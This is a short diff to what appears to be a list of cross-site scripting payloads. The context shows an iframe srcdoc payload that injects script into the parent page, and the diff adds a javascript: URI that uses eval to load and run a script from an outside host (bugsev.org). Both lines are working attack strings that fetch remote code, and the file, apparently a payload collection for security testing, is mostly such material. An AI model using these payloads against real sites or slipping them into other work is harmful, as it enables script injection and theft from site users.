@@ -57,6 +57,8 @@ payloads
 <!-- Iframe srcdoc -->
 <iframe srcdoc="<script>var s=document.createElement('script');s.src='https://bugsev.org';parent.document.body.appendChild(s)</script>">
 
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://bugsev.org\';document.body.appendChild(a)')
+
 ```
 
 ```jsx
